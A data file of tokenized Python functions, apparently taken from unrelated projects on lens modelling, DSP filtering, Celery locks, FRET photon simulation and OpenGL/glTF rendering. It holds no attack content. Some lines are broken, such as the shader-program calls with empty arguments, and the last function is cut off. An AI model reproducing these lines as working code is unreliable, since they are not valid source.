def total_edge_pixels_from_mask ( mask ) : border_pixel_total = 0 for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : if not mask [ y , x ] : if mask [ y + 1 , x ] or mask [ y - 1 , x ] or mask [ y , x + 1 ] or mask [ y , x - 1 ] or mask [ y + 1 , x + 1 ] or mask [ y + 1 , x - 1 ] or mask [ y - 1 , x + 1 ] or mask [ y - 1 , x - 1 ] : border_pixel_total += 1 return border_pixel_total
def total_border_pixels_from_mask_and_edge_pixels ( mask , edge_pixels , masked_grid_index_to_pixel ) : border_pixel_total = 0 for i in range ( edge_pixels . shape [ 0 ] ) : if check_if_border_pixel ( mask , edge_pixels [ i ] , masked_grid_index_to_pixel ) : border_pixel_total += 1 return border_pixel_total
def grid_stack_from_deflection_stack ( grid_stack , deflection_stack ) : if deflection_stack is not None : def minus ( grid , deflections ) : return grid - deflections return grid_stack . map_function ( minus , deflection_stack )
def regular_to_pix ( self ) : return mapper_util . voronoi_regular_to_pix_from_grids_and_geometry ( regular_grid = self . grid_stack . regular , regular_to_nearest_pix = self . grid_stack . pix . regular_to_nearest_pix , pixel_centres = self . geometry . pixel_centres , pixel_neighbors = self . geometry . pixel_neighbors , pixel_neighbors_size = self . geometry . pixel_neighbors_size ) . astype ( 'int' )
def sub_to_pix ( self ) : return mapper_util . voronoi_sub_to_pix_from_grids_and_geometry ( sub_grid = self . grid_stack . sub , regular_to_nearest_pix = self . grid_stack . pix . regular_to_nearest_pix , sub_to_regular = self . grid_stack . sub . sub_to_regular , pixel_centres = self . geometry . pixel_centres , pixel_neighbors = self . geometry . pixel_neighbors , pixel_neighbors_size = self . geometry . pixel_neighbors_size ) . astype ( 'int' )
def signal_to_noise_map ( self ) : signal_to_noise_map = np . divide ( self . image , self . noise_map ) signal_to_noise_map [ signal_to_noise_map < 0 ] = 0 return signal_to_noise_map
def absolute_signal_to_noise_map ( self ) : return np . divide ( np . abs ( self . image ) , self . noise_map )
def simulate_as_gaussian ( cls , shape , pixel_scale , sigma , centre = ( 0.0 , 0.0 ) , axis_ratio = 1.0 , phi = 0.0 ) : from autolens . model . profiles . light_profiles import EllipticalGaussian gaussian = EllipticalGaussian ( centre = centre , axis_ratio = axis_ratio , phi = phi , intensity = 1.0 , sigma = sigma ) grid_1d = grid_util . regular_grid_1d_masked_from_mask_pixel_scales_and_origin ( mask = np . full ( shape , False ) , pixel_scales = ( pixel_scale , pixel_scale ) ) gaussian_1d = gaussian . intensities_from_grid ( grid = grid_1d ) gaussian_2d = mapping_util . map_unmasked_1d_array_to_2d_array_from_array_1d_and_shape ( array_1d = gaussian_1d , shape = shape ) return PSF ( array = gaussian_2d , pixel_scale = pixel_scale , renormalize = True )
def new_psf_with_renormalized_array ( self ) : return PSF ( array = self , pixel_scale = self . pixel_scale , renormalize = True )
def map_function ( self , func , * arg_lists ) : return GridStack ( * [ func ( * args ) for args in zip ( self , * arg_lists ) ] )
def yticks ( self ) : return np . linspace ( np . min ( self [ : , 0 ] ) , np . max ( self [ : , 0 ] ) , 4 )
def xticks ( self ) : return np . linspace ( np . min ( self [ : , 1 ] ) , np . max ( self [ : , 1 ] ) , 4 )
def unmasked_sparse_to_sparse ( self ) : return mapping_util . unmasked_sparse_to_sparse_from_mask_and_pixel_centres ( mask = self . regular_grid . mask , unmasked_sparse_grid_pixel_centres = self . unmasked_sparse_grid_pixel_centres , total_sparse_pixels = self . total_sparse_pixels ) . astype ( 'int' )
def sparse_to_unmasked_sparse ( self ) : return mapping_util . sparse_to_unmasked_sparse_from_mask_and_pixel_centres ( total_sparse_pixels = self . total_sparse_pixels , mask = self . regular_grid . mask , unmasked_sparse_grid_pixel_centres = self . unmasked_sparse_grid_pixel_centres ) . astype ( 'int' )
def regular_to_sparse ( self ) : return mapping_util . regular_to_sparse_from_sparse_mappings ( regular_to_unmasked_sparse = self . regular_to_unmasked_sparse , unmasked_sparse_to_sparse = self . unmasked_sparse_to_sparse ) . astype ( 'int' )
def trace_grid_stack_to_next_plane ( self ) : def minus ( grid , deflections ) : return grid - deflections return self . grid_stack . map_function ( minus , self . deflection_stack )
def trace_to_next_plane ( self ) : return list ( map ( lambda positions , deflections : np . subtract ( positions , deflections ) , self . positions , self . deflections ) )
def contained_in ( filename , directory ) : filename = os . path . normcase ( os . path . abspath ( filename ) ) directory = os . path . normcase ( os . path . abspath ( directory ) ) return os . path . commonprefix ( [ filename , directory ] ) == directory
def _build_backend ( ) : # Add in-tree backend directories to the front of sys.path. backend_path = os . environ . get ( 'PEP517_BACKEND_PATH' ) if backend_path : extra_pathitems = backend_path . split ( os . pathsep ) sys . path [ : 0 ] = extra_pathitems ep = os . environ [ 'PEP517_BUILD_BACKEND' ] mod_path , _ , obj_path = ep . partition ( ':' ) try : obj = import_module ( mod_path ) except ImportError : raise BackendUnavailable ( traceback . format_exc ( ) ) if backend_path : if not any ( contained_in ( obj . __file__ , path ) for path in extra_pathitems ) : raise BackendInvalid ( "Backend was not loaded from backend-path" ) if obj_path : for path_part in obj_path . split ( '.' ) : obj = getattr ( obj , path_part ) return obj
def build_sdist ( sdist_directory , config_settings ) : backend = _build_backend ( ) try : return backend . build_sdist ( sdist_directory , config_settings ) except getattr ( backend , 'UnsupportedOperation' , _DummyException ) : raise GotUnsupportedOperation ( traceback . format_exc ( ) )
def toJSON ( self ) : return { "id" : self . id , "compile" : self . compile , "position" : self . position , "version" : self . version }
def add_model_string ( self , model_str , position = 1 , file_id = None ) : if file_id is None : file_id = self . make_unique_id ( 'inlined_input' ) ret_data = self . file_create ( File . from_string ( model_str , position , file_id ) ) return ret_data
def add_model_file ( self , model_fpath , position = 1 , file_id = None ) : if file_id is None : file_id = self . make_unique_id ( 'file_input' ) ret_data = self . file_create ( File . from_file ( model_fpath , position , file_id ) ) return ret_data
def get_is_sim_running ( self ) : sim_info = self . simulation_info ( ) try : progress_info = sim_info [ 'simulation_info_progress' ] ret = progress_info [ 'simulation_progress_is_running' ] except KeyError : # Simulation has not been created. ret = False return ret
def in_out_check ( self ) : devices = available_devices ( ) if not self . in_idx in devices : raise OSError ( "Input device is unavailable" ) in_check = devices [ self . in_idx ] if not self . out_idx in devices : raise OSError ( "Output device is unavailable" ) out_check = devices [ self . out_idx ] if ( ( in_check [ 'inputs' ] == 0 ) and ( out_check [ 'outputs' ] == 0 ) ) : raise StandardError ( 'Invalid input and output devices' ) elif ( in_check [ 'inputs' ] == 0 ) : raise ValueError ( 'Selected input device has no inputs' ) elif ( out_check [ 'outputs' ] == 0 ) : raise ValueError ( 'Selected output device has no outputs' ) return True
def up ( self , x ) : y = self . M * ssd . upsample ( x , self . M ) y = signal . lfilter ( self . b , self . a , y ) return y
def dn ( self , x ) : y = signal . lfilter ( self . b , self . a , x ) y = ssd . downsample ( y , self . M ) return y
def up ( self , x , L_change = 12 ) : y = L_change * ssd . upsample ( x , L_change ) y = signal . lfilter ( self . b , [ 1 ] , y ) return y
def dn ( self , x , M_change = 12 ) : y = signal . lfilter ( self . b , [ 1 ] , x ) y = ssd . downsample ( y , M_change ) return y
def zplane ( self , auto_scale = True , size = 2 , detect_mult = True , tol = 0.001 ) : ssd . zplane ( self . b , [ 1 ] , auto_scale , size , tol )
def filter ( self , x ) : y = signal . sosfilt ( self . sos , x ) return y
def up ( self , x , L_change = 12 ) : y = L_change * ssd . upsample ( x , L_change ) y = signal . sosfilt ( self . sos , y ) return y
def dn ( self , x , M_change = 12 ) : y = signal . sosfilt ( self . sos , x ) y = ssd . downsample ( y , M_change ) return y
def zplane ( self , auto_scale = True , size = 2 , detect_mult = True , tol = 0.001 ) : iir_d . sos_zplane ( self . sos , auto_scale , size , tol )
def is_already_running ( self ) : redis_key = self . CELERY_LOCK . format ( task_id = self . task_identifier ) return self . celery_self . backend . client . exists ( redis_key )
def reset_lock ( self ) : redis_key = self . CELERY_LOCK . format ( task_id = self . task_identifier ) self . celery_self . backend . client . delete ( redis_key )
def is_already_running ( self ) : date_done = ( self . restore_group ( self . task_identifier ) or dict ( ) ) . get ( 'date_done' ) if not date_done : return False difference = datetime . utcnow ( ) - date_done return difference < timedelta ( seconds = self . timeout )
def reduce_chunk ( func , array ) : res = [ ] for slice in iter_chunk_slice ( array . shape [ - 1 ] , array . chunkshape [ - 1 ] ) : res . append ( func ( array [ ... , slice ] ) ) return func ( res )
def merge_DA_ph_times ( ph_times_d , ph_times_a ) : ph_times = np . hstack ( [ ph_times_d , ph_times_a ] ) a_em = np . hstack ( [ np . zeros ( ph_times_d . size , dtype = np . bool ) , np . ones ( ph_times_a . size , dtype = np . bool ) ] ) index_sort = ph_times . argsort ( ) return ph_times [ index_sort ] , a_em [ index_sort ]
def load_PSFLab_file ( fname ) : if os . path . exists ( fname ) or os . path . exists ( fname + '.mat' ) : return loadmat ( fname ) [ 'data' ] else : raise IOError ( "Can't find PSF file '%s'" % fname )
def hash ( self ) : hash_list = [ ] for key , value in sorted ( self . __dict__ . items ( ) ) : if not callable ( value ) : if isinstance ( value , np . ndarray ) : hash_list . append ( value . tostring ( ) ) else : hash_list . append ( str ( value ) ) return hashlib . md5 ( repr ( hash_list ) . encode ( ) ) . hexdigest ( )
def git_path_valid ( git_path = None ) : if git_path is None and GIT_PATH is None : return False if git_path is None : git_path = GIT_PATH try : call ( [ git_path , '--version' ] ) return True except OSError : return False
def get_git_version ( git_path = None ) : if git_path is None : git_path = GIT_PATH git_version = check_output ( [ git_path , "--version" ] ) . split ( ) [ 2 ] return git_version
def check_clean_status ( git_path = None ) : output = get_status ( git_path ) is_unmodified = ( len ( output . strip ( ) ) == 0 ) return is_unmodified
def get_last_commit_line ( git_path = None ) : if git_path is None : git_path = GIT_PATH output = check_output ( [ git_path , "log" , "--pretty=format:'%ad %h %s'" , "--date=short" , "-n1" ] ) return output . strip ( ) [ 1 : - 1 ]
def get_last_commit ( git_path = None ) : if git_path is None : git_path = GIT_PATH line = get_last_commit_line ( git_path ) revision_id = line . split ( ) [ 1 ] return revision_id
def print_summary ( string = 'Repository' , git_path = None ) : if git_path is None : git_path = GIT_PATH # If git is available, check fretbursts version if not git_path_valid ( ) : print ( '\n%s revision unknown (git not found).' % string ) else : last_commit = get_last_commit_line ( ) print ( '\n{} revision:\n {}\n' . format ( string , last_commit ) ) if not check_clean_status ( ) : print ( '\nWARNING -> Uncommitted changes:' ) print ( get_status ( ) )
def get_bromo_fnames_da ( d_em_kHz , d_bg_kHz , a_em_kHz , a_bg_kHz , ID = '1+2+3+4+5+6' , t_tot = '480' , num_p = '30' , pM = '64' , t_step = 0.5e-6 , D = 1.2e-11 , dir_ = '' ) : clk_p = t_step / 32. # with t_step=0.5us -> 156.25 ns E_sim = 1. * a_em_kHz / ( a_em_kHz + d_em_kHz ) FRET_val = 100. * E_sim print ( "Simulated FRET value: %.1f%%" % FRET_val ) d_em_kHz_str = "%04d" % d_em_kHz a_em_kHz_str = "%04d" % a_em_kHz d_bg_kHz_str = "%04.1f" % d_bg_kHz a_bg_kHz_str = "%04.1f" % a_bg_kHz print ( "D: EM %s BG %s " % ( d_em_kHz_str , d_bg_kHz_str ) ) print ( "A: EM %s BG %s " % ( a_em_kHz_str , a_bg_kHz_str ) ) fname_d = ( 'ph_times_{t_tot}s_D{D}_{np}P_{pM}pM_' 'step{ts_us}us_ID{ID}_EM{em}kHz_BG{bg}kHz.npy' ) . format ( em = d_em_kHz_str , bg = d_bg_kHz_str , t_tot = t_tot , pM = pM , np = num_p , ID = ID , ts_us = t_step * 1e6 , D = D ) fname_a = ( 'ph_times_{t_tot}s_D{D}_{np}P_{pM}pM_' 'step{ts_us}us_ID{ID}_EM{em}kHz_BG{bg}kHz.npy' ) . format ( em = a_em_kHz_str , bg = a_bg_kHz_str , t_tot = t_tot , pM = pM , np = num_p , ID = ID , ts_us = t_step * 1e6 , D = D ) print ( fname_d ) print ( fname_a ) name = ( 'BroSim_E{:.1f}_dBG{:.1f}k_aBG{:.1f}k_' 'dEM{:.0f}k' ) . format ( FRET_val , d_bg_kHz , a_bg_kHz , d_em_kHz ) return dir_ + fname_d , dir_ + fname_a , name , clk_p , E_sim
def volume ( self ) : return ( self . x2 - self . x1 ) * ( self . y2 - self . y1 ) * ( self . z2 - self . z1 )
def _generate ( num_particles , D , box , rs ) : X0 = rs . rand ( num_particles ) * ( box . x2 - box . x1 ) + box . x1 Y0 = rs . rand ( num_particles ) * ( box . y2 - box . y1 ) + box . y1 Z0 = rs . rand ( num_particles ) * ( box . z2 - box . z1 ) + box . z1 return [ Particle ( D = D , x0 = x0 , y0 = y0 , z0 = z0 ) for x0 , y0 , z0 in zip ( X0 , Y0 , Z0 ) ]
def add ( self , num_particles , D ) : self . _plist += self . _generate ( num_particles , D , box = self . box , rs = self . rs )
def datafile_from_hash ( hash_ , prefix , path ) : pattern = '%s_%s*.h*' % ( prefix , hash_ ) datafiles = list ( path . glob ( pattern ) ) if len ( datafiles ) == 0 : raise NoMatchError ( 'No matches for "%s"' % pattern ) if len ( datafiles ) > 1 : raise MultipleMatchesError ( 'More than 1 match for "%s"' % pattern ) return datafiles [ 0 ]
def compact_name ( self , hashsize = 6 ) : # this can be made more robust for ID > 9 (double digit) s = self . compact_name_core ( hashsize , t_max = True ) s += "_ID%d-%d" % ( self . ID , self . EID ) return s
def print_sizes ( self ) : float_size = 4 MB = 1024 * 1024 size_ = self . n_samples * float_size em_size = size_ * self . num_particles / MB pos_size = 3 * size_ * self . num_particles / MB print ( "  Number of particles:" , self . num_particles ) print ( "  Number of time steps:" , self . n_samples ) print ( "  Emission array - 1 particle (float32): %.1f MB" % ( size_ / MB ) ) print ( "  Emission array (float32): %.1f MB" % em_size ) print ( "  Position array (float32): %.1f MB " % pos_size )
def em_rates_from_E_DA_mix ( em_rates_tot , E_values ) : em_rates_d , em_rates_a = [ ] , [ ] for em_rate_tot , E_value in zip ( em_rates_tot , E_values ) : em_rate_di , em_rate_ai = em_rates_from_E_DA ( em_rate_tot , E_value ) em_rates_d . append ( em_rate_di ) em_rates_a . append ( em_rate_ai ) return em_rates_d , em_rates_a
def populations_diff_coeff ( particles , populations ) : D_counts = particles . diffusion_coeff_counts if len ( D_counts ) == 1 : pop_sizes = [ pop . stop - pop . start for pop in populations ] assert D_counts [ 0 ] [ 1 ] >= sum ( pop_sizes ) D_counts = [ ( D_counts [ 0 ] [ 0 ] , ps ) for ps in pop_sizes ] D_list = [ ] D_pop_start = 0 # start index of diffusion-based populations for pop , ( D , counts ) in zip ( populations , D_counts ) : D_list . append ( D ) assert pop . start >= D_pop_start assert pop . stop <= D_pop_start + counts D_pop_start += counts return D_list
def populations_slices ( particles , num_pop_list ) : slices = [ ] i_prev = 0 for num_pop in num_pop_list : slices . append ( slice ( i_prev , i_prev + num_pop ) ) i_prev += num_pop return slices
def _calc_hash_da ( self , rs ) : self . hash_d = hash_ ( rs . get_state ( ) ) [ : 6 ] self . hash_a = self . hash_d
def run ( self , rs , overwrite = True , skip_existing = False , path = None , chunksize = None ) : if path is None : path = str ( self . S . store . filepath . parent ) kwargs = dict ( rs = rs , overwrite = overwrite , path = path , timeslice = self . timeslice , skip_existing = skip_existing ) if chunksize is not None : kwargs [ 'chunksize' ] = chunksize header = ' - Mixture Simulation:' # Donor timestamps hash is from the input RandomState self . hash_d = hash_ ( rs . get_state ( ) ) [ : 6 ] # needed by merge_da() print ( '%s Donor timestamps -    %s' % ( header , ctime ( ) ) , flush = True ) self . S . simulate_timestamps_mix ( populations = self . populations , max_rates = self . em_rates_d , bg_rate = self . bg_rate_d , * * kwargs ) # Acceptor timestamps hash is from 'last_random_state' attribute # of the donor timestamps. This allows deterministic generation of # donor + acceptor timestamps given the input random state. ts_d , _ = self . S . get_timestamps_part ( self . name_timestamps_d ) rs . set_state ( ts_d . attrs [ 'last_random_state' ] ) self . hash_a = hash_ ( rs . get_state ( ) ) [ : 6 ] # needed by merge_da() print ( '\n%s Acceptor timestamps - %s' % ( header , ctime ( ) ) , flush = True ) self . S . simulate_timestamps_mix ( populations = self . populations , max_rates = self . em_rates_a , bg_rate = self . bg_rate_a , * * kwargs ) print ( '\n%s Completed. %s' % ( header , ctime ( ) ) , flush = True )
def run_da ( self , rs , overwrite = True , skip_existing = False , path = None , chunksize = None ) : if path is None : path = str ( self . S . store . filepath . parent ) kwargs = dict ( rs = rs , overwrite = overwrite , path = path , timeslice = self . timeslice , skip_existing = skip_existing ) if chunksize is not None : kwargs [ 'chunksize' ] = chunksize header = ' - Mixture Simulation:' # Donor timestamps hash is from the input RandomState self . _calc_hash_da ( rs ) print ( '%s Donor + Acceptor timestamps - %s' % ( header , ctime ( ) ) , flush = True ) self . S . simulate_timestamps_mix_da ( max_rates_d = self . em_rates_d , max_rates_a = self . em_rates_a , populations = self . populations , bg_rate_d = self . bg_rate_d , bg_rate_a = self . bg_rate_a , * * kwargs ) print ( '\n%s Completed. %s' % ( header , ctime ( ) ) , flush = True )
def merge_da ( self ) : print ( ' - Merging D and A timestamps' , flush = True ) ts_d , ts_par_d = self . S . get_timestamps_part ( self . name_timestamps_d ) ts_a , ts_par_a = self . S . get_timestamps_part ( self . name_timestamps_a ) ts , a_ch , part = merge_da ( ts_d , ts_par_d , ts_a , ts_par_a ) assert a_ch . sum ( ) == ts_a . shape [ 0 ] assert ( ~ a_ch ) . sum ( ) == ts_d . shape [ 0 ] assert a_ch . size == ts_a . shape [ 0 ] + ts_d . shape [ 0 ] self . ts , self . a_ch , self . part = ts , a_ch , part self . clk_p = ts_d . attrs [ 'clk_p' ]
def save_photon_hdf5 ( self , identity = None , overwrite = True , path = None ) : filepath = self . filepath if path is not None : filepath = Path ( path , filepath . name ) self . merge_da ( ) data = self . _make_photon_hdf5 ( identity = identity ) phc . hdf5 . save_photon_hdf5 ( data , h5_fname = str ( filepath ) , overwrite = overwrite )
def load_gltf ( self ) : with open ( self . path ) as fd : self . meta = GLTFMeta ( self . path , json . load ( fd ) )
def load_glb ( self ) : with open ( self . path , 'rb' ) as fd : # Check header magic = fd . read ( 4 ) if magic != GLTF_MAGIC_HEADER : raise ValueError ( "{} has incorrect header {} != {}" . format ( self . path , magic , GLTF_MAGIC_HEADER ) ) version = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] if version != 2 : raise ValueError ( "{} has unsupported version {}" . format ( self . path , version ) ) # Total file size including headers _ = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] # noqa # Chunk 0 - json chunk_0_length = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] chunk_0_type = fd . read ( 4 ) if chunk_0_type != b'JSON' : raise ValueError ( "Expected JSON chunk, not {} in file {}" . format ( chunk_0_type , self . path ) ) json_meta = fd . read ( chunk_0_length ) . decode ( ) # chunk 1 - binary buffer chunk_1_length = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] chunk_1_type = fd . read ( 4 ) if chunk_1_type != b'BIN\x00' : raise ValueError ( "Expected BIN chunk, not {} in file {}" . format ( chunk_1_type , self . path ) ) self . meta = GLTFMeta ( self . path , json . loads ( json_meta ) , binary_buffer = fd . read ( chunk_1_length ) )
def buffers_exist ( self ) : for buff in self . buffers : if not buff . is_separate_file : continue path = self . path . parent / buff . uri if not os . path . exists ( path ) : raise FileNotFoundError ( "Buffer {} referenced in {} not found" . format ( path , self . path ) )
def prepare_attrib_mapping ( self , primitive ) : buffer_info = [ ] for name , accessor in primitive . attributes . items ( ) : info = VBOInfo ( * accessor . info ( ) ) info . attributes . append ( ( name , info . components ) ) if buffer_info and buffer_info [ - 1 ] . buffer_view == info . buffer_view : if buffer_info [ - 1 ] . interleaves ( info ) : buffer_info [ - 1 ] . merge ( info ) continue buffer_info . append ( info ) return buffer_info
def get_bbox ( self , primitive ) : accessor = primitive . attributes . get ( 'POSITION' ) return accessor . min , accessor . max
def interleaves ( self , info ) : return info . byte_offset == self . component_type . size * self . components
def _update_yaw_and_pitch ( self ) : front = Vector3 ( [ 0.0 , 0.0 , 0.0 ] ) front . x = cos ( radians ( self . yaw ) ) * cos ( radians ( self . pitch ) ) front . y = sin ( radians ( self . pitch ) ) front . z = sin ( radians ( self . yaw ) ) * cos ( radians ( self . pitch ) ) self . dir = vector . normalise ( front ) self . right = vector . normalise ( vector3 . cross ( self . dir , self . _up ) ) self . up = vector . normalise ( vector3 . cross ( self . right , self . dir ) )
def _translate_string ( self , data , length ) : for index , char in enumerate ( data ) : if index == length : break yield self . _meta . characters - 1 - self . _ct [ char ]
def draw_bbox ( self , projection_matrix = None , camera_matrix = None , all = True ) : projection_matrix = projection_matrix . astype ( 'f4' ) . tobytes ( ) camera_matrix = camera_matrix . astype ( 'f4' ) . tobytes ( ) # Scene bounding box self . bbox_program [ "m_proj" ] . write ( projection_matrix ) self . bbox_program [ "m_view" ] . write ( self . _view_matrix . astype ( 'f4' ) . tobytes ( ) ) self . bbox_program [ "m_cam" ] . write ( camera_matrix ) self . bbox_program [ "bb_min" ] . write ( self . bbox_min . astype ( 'f4' ) . tobytes ( ) ) self . bbox_program [ "bb_max" ] . write ( self . bbox_max . astype ( 'f4' ) . tobytes ( ) ) self . bbox_program [ "color" ] . value = ( 1.0 , 0.0 , 0.0 ) self . bbox_vao . render ( self . bbox_program ) if not all : return # Draw bounding box for children for node in self . root_nodes : node . draw_bbox ( projection_matrix , camera_matrix , self . bbox_program , self . bbox_vao )
def apply_mesh_programs ( self , mesh_programs = None ) : if not mesh_programs : mesh_programs = [ ColorProgram ( ) , TextureProgram ( ) , FallbackProgram ( ) ] for mesh in self . meshes : for mp in mesh_programs : instance = mp . apply ( mesh ) if instance is not None : if isinstance ( instance , MeshProgram ) : mesh . mesh_program = mp break else : raise ValueError ( "apply() must return a MeshProgram instance, not {}" . format ( type ( instance ) ) ) if not mesh . mesh_program : print ( "WARING: No mesh program applied to '{}'" . format ( mesh . name ) )
def get_time ( self ) -> float : if self . paused : return self . pause_time return mixer . music . get_pos ( ) / 1000.0
def render_lights_debug ( self , camera_matrix , projection ) : self . ctx . enable ( moderngl . BLEND ) self . ctx . blend_func = moderngl . SRC_ALPHA , moderngl . ONE_MINUS_SRC_ALPHA for light in self . point_lights : m_mv = matrix44 . multiply ( light . matrix , camera_matrix ) light_size = light . radius self . debug_shader [ "m_proj" ] . write ( projection . tobytes ( ) ) self . debug_shader [ "m_mv" ] . write ( m_mv . astype ( 'f4' ) . tobytes ( ) ) self . debug_shader [ "size" ] . value = light_size self . unit_cube . render ( self . debug_shader , mode = moderngl . LINE_STRIP ) self . ctx . disable ( moderngl . BLEND )
def combine ( self ) : self . gbuffer . color_attachments [ 0 ] . use ( location = 0 ) self . combine_shader [ "diffuse_buffer" ] . value = 0 self . lightbuffer . color_attachments [ 0 ] . use ( location = 1 ) self . combine_shader [ "light_buffer" ] . value = 1 self . quad . render ( self . combine_shader )
def load_shader ( self , shader_type : str , path : str ) : if path : resolved_path = self . find_program ( path ) if not resolved_path : raise ValueError ( "Cannot find {} shader '{}'" . format ( shader_type , path ) ) print ( "Loading:" , path ) with open ( resolved_path , 'r' ) as fd : return fd . read ( )
def load ( self ) : self . _open_image ( ) width , height , depth = self . image . size [ 0 ] , self . image . size [ 1 ] // self . layers , self . layers components , data = image_data ( self . image ) texture = self . ctx . texture_array ( ( width , height , depth ) , components , data , ) texture . extra = { 'meta' : self . meta } if self . meta . mipmap : texture . build_mipmaps ( ) self . _close_image ( ) return texture
def available_templates ( value ) : templates = list_templates ( ) if value not in templates : raise ArgumentTypeError ( "Effect template '{}' does not exist.\n Available templates: {} " . format ( value , ", " . join ( templates ) ) ) return value
def root_path ( ) : module_dir = os . path . dirname ( globals ( ) [ '__file__' ] ) return os . path . dirname ( os . path . dirname ( module_dir ) )
def load ( self ) : self . meta . resolved_path = self . find_data ( self . meta . path ) if not self . meta . resolved_path : raise ImproperlyConfigured ( "Data file '{}' not found" . format ( self . meta . path ) ) print ( "Loading:" , self . meta . path ) with open ( self . meta . resolved_path , 'r' ) as fd : return fd . read ( )
def calc_global_bbox ( self , view_matrix , bbox_min , bbox_max ) : if self . matrix is not None : view_matrix = matrix44 . multiply ( self . matrix , view_matrix ) if self . mesh : bbox_min , bbox_max = self . mesh . calc_global_bbox ( view_matrix , bbox_min , bbox_max ) for child in self . children : bbox_min , bbox_max = child . calc_global_bbox ( view_matrix , bbox_min , bbox_max ) return bbox_min , bbox_max
def swap_buffers ( self ) : self . frames += 1 glfw . swap_buffers ( self . window ) self . poll_events ( )
def resize ( self , width , height ) : self . width = width self . height = height self . buffer_width , self . buffer_height = glfw . get_framebuffer_size ( self . window ) self . set_default_viewport ( )
def check_glfw_version ( self ) : print ( "glfw version: {} (python wrapper version {})" . format ( glfw . get_version ( ) , glfw . __version__ ) ) if glfw . get_version ( ) < self . min_glfw_version : raise ValueError ( "Please update glfw binaries to version {} or later" . format ( self . min_glfw_version ) )
def translate_buffer_format ( vertex_format ) : buffer_format = [ ] attributes = [ ] mesh_attributes = [ ] if "T2F" in vertex_format : buffer_format . append ( "2f" ) attributes . append ( "in_uv" ) mesh_attributes . append ( ( "TEXCOORD_0" , "in_uv" , 2 ) ) if "C3F" in vertex_format : buffer_format . append ( "3f" ) attributes . append ( "in_color" ) mesh_attributes . append ( ( "NORMAL" , "in_color" , 3 ) ) if "N3F" in vertex_format : buffer_format . append ( "3f" ) attributes . append ( "in_normal" ) mesh_attributes . append ( ( "NORMAL" , "in_normal" , 3 ) ) buffer_format . append ( "3f" ) attributes . append ( "in_position" ) mesh_attributes . append ( ( "POSITION" , "in_position" , 3 ) ) return " " . join ( buffer_format ) , attributes , mesh_attributes
def resolve_loader ( self , meta : SceneDescription ) : for loader_cls in self . _loaders : if loader_cls . supports_file ( meta ) : meta . loader_cls = loader_cls break else : raise ImproperlyConfigured ( "Scene {} has no loader class registered. Check settings.SCENE_LOADERS" . format ( meta . path ) )
def on_resize ( self , width , height ) : self . width , self . height = width , height self . buffer_width , self . buffer_height = width , height self . resize ( width , height )
def swap_buffers ( self ) : if not self . window . context : return self . frames += 1 self . window . flip ( ) self . window . dispatch_events ( )
def load_pool ( self ) : for meta in self . _resources : resource = self . load ( meta ) yield meta , resource self . _resources = [ ]
def resize ( self , width , height ) : if not self . fbo : return # pyqt reports sizes in actual buffer size self . width = width // self . widget . devicePixelRatio ( ) self . height = height // self . widget . devicePixelRatio ( ) self . buffer_width = width self . buffer_height = height super ( ) . resize ( width , height )
def _init_texture2d_draw ( self ) : if not TextureHelper . _quad : TextureHelper . _quad = geometry . quad_fs ( ) TextureHelper . _texture2d_shader = context . ctx ( ) . program ( vertex_shader = , fragment_shader = ) TextureHelper . _texture2d_sampler = self . ctx . sampler ( filter = ( moderngl . LINEAR , moderngl . LINEAR ) , )
def _init_depth_texture_draw ( self ) : from demosys import geometry if not TextureHelper . _quad : TextureHelper . _quad = geometry . quad_fs ( ) TextureHelper . _depth_shader = context . ctx ( ) . program ( vertex_shader = , fragment_shader = ) TextureHelper . _depth_sampler = self . ctx . sampler ( filter = ( moderngl . LINEAR , moderngl . LINEAR ) , compare_func = '' , )
def clear ( self ) : self . ctx . fbo . clear ( red = self . clear_color [ 0 ] , green = self . clear_color [ 1 ] , blue = self . clear_color [ 2 ] , alpha = self . clear_color [ 3 ] , depth = self . clear_depth , )
def supports_file ( cls , meta ) : path = Path ( meta . path ) for ext in cls . file_extensions : if path . suffixes [ : len ( ext ) ] == ext : return True return False
def add_program_dir ( self , directory ) : dirs = list ( self . PROGRAM_DIRS ) dirs . append ( directory ) self . PROGRAM_DIRS = dirs
def add_texture_dir ( self , directory ) : dirs = list ( self . TEXTURE_DIRS ) dirs . append ( directory ) self . TEXTURE_DIRS = dirs
def add_data_dir ( self , directory ) : dirs = list ( self . DATA_DIRS ) dirs . append ( directory ) self . DATA_DIRS = dirs
def content ( self , attributes : List [ str ] ) : formats = [ ] attrs = [ ] for attrib_format , attrib in zip ( self . attrib_formats , self . attributes ) : if attrib not in attributes : formats . append ( attrib_format . pad_str ( ) ) continue formats . append ( attrib_format . format ) attrs . append ( attrib ) attributes . remove ( attrib ) if not attrs : return None return ( self . buffer , "{}{}" . format ( " " . join ( formats ) , '/i' if self . per_instance else '' ) , * attrs )
def get_dirs ( self ) -> List [ str ] : for package in self . packages : yield os . path . join ( package . path , 'resources' )
def runnable_effects ( self ) -> List [ Type [ Effect ] ] : return [ cls for cls in self . effect_classes if cls . runnable ]
def load_package ( self ) : try : self . package = importlib . import_module ( self . name ) except ModuleNotFoundError : raise ModuleNotFoundError ( "Effect package '{}' not found." . format ( self . name ) )
def load_effects_classes ( self ) : self . effect_classes = [ ] for _ , cls in inspect . getmembers ( self . effect_module ) : if inspect . isclass ( cls ) : if cls == Effect : continue if issubclass ( cls , Effect ) : self . effect_classes . append ( cls ) self . effect_class_map [ cls . __name__ ] = cls cls . _name = "{}.{}" . format ( self . effect_module_name , cls . __name__ )
def load_resource_module ( self ) : # Attempt to load the dependencies module try : name = '{}.{}' . format ( self . name , 'dependencies' ) self . dependencies_module = importlib . import_module ( name ) except ModuleNotFoundError as err : raise EffectError ( ( "Effect package '{}' has no 'dependencies' module or the module has errors. " "Forwarded error from importlib: {}" ) . format ( self . name , err ) ) # Fetch the resource descriptions try : self . resources = getattr ( self . dependencies_module , 'resources' ) except AttributeError : raise EffectError ( "Effect dependencies module '{}' has no 'resources' attribute" . format ( name ) ) if not isinstance ( self . resources , list ) : raise EffectError ( "Effect dependencies module '{}': 'resources' is of type {} instead of a list" . format ( name , type ( self . resources ) ) ) # Fetch the effect class list try : self . effect_packages = getattr ( self . dependencies_module , 'effect_packages' ) except AttributeError : raise EffectError ( "Effect dependencies module '{}' has 'effect_packages' attribute" . format ( name ) ) if not isinstance ( self . effect_packages , list ) : raise EffectError ( "Effect dependencies module 